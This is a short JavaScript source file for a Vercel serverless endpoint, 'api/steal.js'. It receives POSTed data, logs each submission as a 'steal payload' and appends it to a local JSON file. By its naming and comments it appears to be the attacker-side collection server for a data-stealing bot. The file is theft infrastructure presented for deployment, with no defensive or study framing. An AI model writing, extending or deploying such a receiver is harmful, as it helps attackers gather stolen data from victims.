// api/steal.js
import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;
    
    // 1. Log to Vercel Console (Go to Vercel Dashboard -> Your Project -> Deployments -> Logs)
    console.log('🔥 NEW STEAL PAYLOAD RECEIVED:', JSON.stringify(data, null, 2));

    // 2. Save to a local JSON file on the Vercel instance (for immediate access)
    // Note: In a high-scale scenario, you'd use MongoDB or Supabase. 
    // For this specific bot, we'll keep it lightweight.
    const filePath = path.join(process.cwd(), 'data.json');
    const existingData = fs.existsSync(filePath) ? JSON.parse(fs.readFileSync(filePath, 'utf8')) : [];
    
    const newEntry = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      ...data
    };
    
    existingData.push(newEntry);
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));

    // 3. Return success
    return res.status(200).json({ 
      status: 'success', 
      id: newEntry.id,
      message: 'Payload recorded.' 
    });

  } catch (error) {
    console.error('❌ Error processing payload:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
}